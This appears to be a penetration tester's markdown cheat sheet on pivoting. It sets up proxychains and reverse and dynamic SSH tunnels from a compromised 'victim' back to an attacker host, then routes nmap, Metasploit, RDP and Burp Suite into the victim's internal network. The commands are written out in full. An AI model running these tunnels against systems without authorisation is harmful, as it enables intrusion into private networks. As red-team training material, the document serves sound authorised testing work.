# Pivoting

## Setting up ProxyChains
##### Allows you to run commands from your kali machine across a tunnel from your victim to other machines the victim is logically connected to

#### Greater than OpenSSH 7.6

If attacking a victim running OpenSSH version lower than 7.6, your process will be different. Older versions don't support -R and have to use a two-way proxy with -D

TODO: Figure out this process

##### On Attacker Box

Open /etc/proxychains4.conf. 

Comment strictchain and uncomment dynamicchain. Uncomment quitemode. Comment proxydns. Then change the default config at the bottom from socks4 127.0.0.1 9080 to socks5 and whatever port you want to use.

Note: For RDP, make sure xclip is installed.

##### Make sure that SSH is listening on Attacker Box

```
Sudo systemctl start ssh.service                                                                                  
```
##### If running over the internet, make sure port forwarding is open and pointing your external port to your internal attacker box interface


##### On Victim Box

```
ssh -N -f -R 127.0.0.1:9080 attacker_username@attacker_IP -p unique_pivot_port                                                                                                  
```

This only requires an ssh client on the victim machine which is extremely common. Only other thing required it to start ssh on your attacker box, as well as a port forwarding rule if it's going over the internet. 

##### On Attacker Box

```
Sudo proxychains nmap --top-ports=20 -sT -sV -sC  -v --open  -Pn IP_Address
Sudo proxychains nmap -iL scope -F -sT -v -Pn | tee fast_scan
```

You can run wrap almost any tool inside of proxychains to force it through the ssh tunnel, including things like metasploit/msfconsole. Extremely useful to utilize proxy 'fun' even if your meta module/other tool doesn't support proxy configuration.

##### Wrapping Metasploit inside of Proxychains

```
sudo proxychains msfconsole
```

This prevents you from having to setup proxies within each module in meta. Some modules don't support proxies so just another layer of difficulty that proxychains helps us avoid.

## Proxy Individual Port like RDP from Victim Back to Host 
#### Allows you to hit individual port that is open on the victim machine like RDP/VNC after you've owned the machine via an exploit

##### On Target

```
ssh -R 33389:localhost:3389 $Username@$Proxy_IP -p $Proxy_Port
```

##### On Proxy

```
ssh -R 4545:locahost:33389 $Username@$Jumpbox_Hostname -p $Jumpbox_Port
```

##### Local Kali

```
sudo systemctl start ssh
```

##### On Host

```
rdp:localhost:3389
```
## Proxy All Traffic Through Victim (Requires opening SSH as a Service on the victim on 127.0.0.1 and known local ssh credentials)

##### On Victim

```
ssh -D 1080 -N -f $local_user@127.0.0.1
ssh -R 10000:localhost:1080 $Username@$Proxy_IP -p $Proxy_Port
```

##### On Proxy

```
sudo systemctl start ssh
```

##### On Jumpbox

```
ssh -L 8887:localhost:10000 $Username@Proxy_IP -p $Proxy_Port
```

##### On Host

```
ssh -L 8887:localhost:8887 $Username@Local_Kali
```

##### If Running Burp Suite

Point burp suite SOCKS5 proxy to 8887 in Burp Network Settings
Point foxyproxy settings to 8080 HTTPS

Should then be able to hit any target on the internal network of your victim directly in proxy browser

## Pivot through a victim without opening a local port
#### (in cases when you don't have access to ssh server)(have to change your target IP when interacting with other internal targets!)

##### On Victim (will have to exit ssh connection to change targets!)

```
ssh -R 10000:$TARGET_IP:$TARGET_PORT $Username@$Proxy_IP
```

##### On Proxy/VPS

```
sudo systemctl start ssh.
```

##### On Jumpbox

```
ssh -L 8887:localhost:10000 $Username@$Proxy_IP
```

##### On Host

```
ssh -L 8887:localhost:8887 $Username@$Jumpbox_IP
```

If Running Burp suite (alernative to above)
Point Burp Suite SOCKS5 proxy to 8887 in Burp Network Settings
Point foxyproxy settings to 8080 HTTPS
